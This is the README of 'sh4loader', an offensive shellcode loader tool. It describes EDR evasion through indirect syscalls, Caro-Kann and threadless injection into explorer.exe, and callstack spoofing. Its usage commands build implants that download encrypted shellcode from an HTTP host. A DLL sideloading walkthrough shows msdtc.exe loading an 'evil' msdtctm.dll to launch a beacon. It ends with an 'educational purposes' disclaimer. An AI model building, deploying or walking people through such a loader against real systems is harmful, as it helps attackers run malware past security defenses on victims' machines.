# sh4loader v2.0.0

<p align="center">
<img src="https://raw.githubusercontent.com/Sh4N4C1/gitbook/main/images/sh4loader_v2.png" alt="sh4loader_v2">
</p>

## ✨ Function

- **No CRT**
- **Dll Sideload**
- **Indirect Syscall**: sh4loader use `indirect` syscall.
- **Caro Kann**: sh4loader use [Caro-Kann](https://github.com/S3cur3Th1sSh1t/Caro-Kann) injection to evade kernel triggered memory scans.
- **Runtime Decrypt Shellcode**: sh4loader will bruteforce shellcode decryption key at runtime.
- **Threadless injection**: sh4loader use threadless injection.
- **CallstackSpoofing**: sh4loader use [CallstackSpoofing](https://github.com/pard0p/CallstackSpoofingPOC)

## Injection Method

- msdtc_dll 
- threadless

## Install

```bash
git clone https://github.com/sh4n4c1/sh4loader.git
cd sh4loader
cargo build --release
./target/release/sh4loader --help
```

if build failed, we need update rustc

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh # update rustc
```

## Usage

```bash
sh4loader -m msdtc_sideload -u http://192.168.75.1/enc_shellcode.bin -p /tmp/shellcode.bin -o /tmp/project
sh4loader -m threadless -u http://192.168.75.1/enc_shellcode.bin -p /tmp/shellcode.bin -o /tmp/project
sh4loader -m threadless -u http://192.168.75.1/enc_shellcode.bin -p /tmp/shellcode.bin -o /tmp/project -r
```

## Detail

### threadless

```bash
sh4loader -m threadless -u http://192.168.75.1/enc_shellcode.bin -p /tmp/shellcode.bin -o /tmp/project -r # delete '-r' to use local injection
```

This implant will find two memory, one for the `xor-encrypted main shellcode`, and one for the `Caro-Kann shellcode`. In threadless injection, it will first hook the target function, and then jump to the fixed shellcode to save the function state and then jump Go to Caro-Kann shellcode, Caro-Kann will help us decrypt and execute the main shellcode

```
  TARGET PROCESS
+-----------------+
|  [function A]   |------+ hooked function called and jump to our <save and jump shellcode> (1)
|    <hooked>     |      |
+-----------------+      |
|   MEMORY HOLE   |      |
| <save and jump> |<-----+ the <save and jump shellcode> will save hooked function state and jump to Caro (2)
|   <Caro-Kann>   |------+ <Caro-Kann shellcode> will sleep and decrypt <main shellcode> (3)
+-----------------+      |
|  [function B]   |      |
+-----------------+      |
|   MEMORY HOLE   |      |
| <main shellcode>|<-----+ <Caro-Kann shellcode> jump to <main shellcode> (4)
+-----------------+
```

1. During the execution of the implant, shellcode is patched to save the jump address.
2. [Callstack spoof](https://github.com/pard0p/CallstackSpoofingPOC) means that NtAPI will be called using the TpReleaseWork proxy.
3. The default function A and function B are `RtlNtStatusToDosError` and `NtCreateWnfStateName` respectively. The default process is `explorer`,because after using API Monitor I found that the explorer process seems to call RtlNtStatusToDosError every other time, and the NtCreateWnfStateName function is used to store the main shellcode.

### msdtc_sideload

```bash
sh4loader -m msdtc_sideload -u http://192.168.75.1/enc_shellcode.bin -p /tmp/shellcode.bin -o /tmp/project
```

Then put the generated msdtctm.dll and msdtc.exe in the same directory. The msdtc.exe from C:\Windows\System32 folder.

```
    [msdtc.exe]
        |
msdtctm.dll loaded for use `DtcMainExt` function    
        |
    [my evil msdtctm.dll]
        |
msdtc.exe lanuch evil `DtcMainExt` function
        |
    [ BEACON ]
```


## Resources

- https://www.vulnlab.com/
- https://maldevacademy.com/
- https://github.com/pard0p/CallstackSpoofingPOC
- https://github.com/CCob/ThreadlessInject
- https://github.com/S3cur3Th1sSh1t/Caro-Kann
- https://github.com/caueb/ThreadlessStompingKann
- https://0xdarkvortex.dev/hiding-in-plainsight/

This is my first time writing a loader.I'm not some sort of expert on malware development, C, C++.I will be making a lot of mistakes,I hope that my coding skills get better and better

Obviously, the stuff in this repository is explicitly for educational purposes.
